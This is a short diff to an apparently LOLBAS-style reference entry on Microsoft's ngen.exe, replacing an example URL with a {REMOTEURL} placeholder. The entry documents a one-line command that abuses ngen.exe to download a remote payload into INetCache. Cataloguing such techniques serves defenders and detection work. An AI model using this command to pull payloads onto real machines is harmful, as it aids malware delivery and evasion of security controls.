@@ -4,7 +4,7 @@ Description: Microsoft Native Image Generator.
 Author: Avihay Eldad
 Created: 2024-02-19
 Commands:
-  - Command: ngen.exe http://example.com/calc.exe
+  - Command: ngen.exe {REMOTEURL}
     Description: Downloads payload from remote server using the Microsoft Native Image Generator utility.
     Usecase: It will download a remote payload and place it in INetCache.
     Category: Download
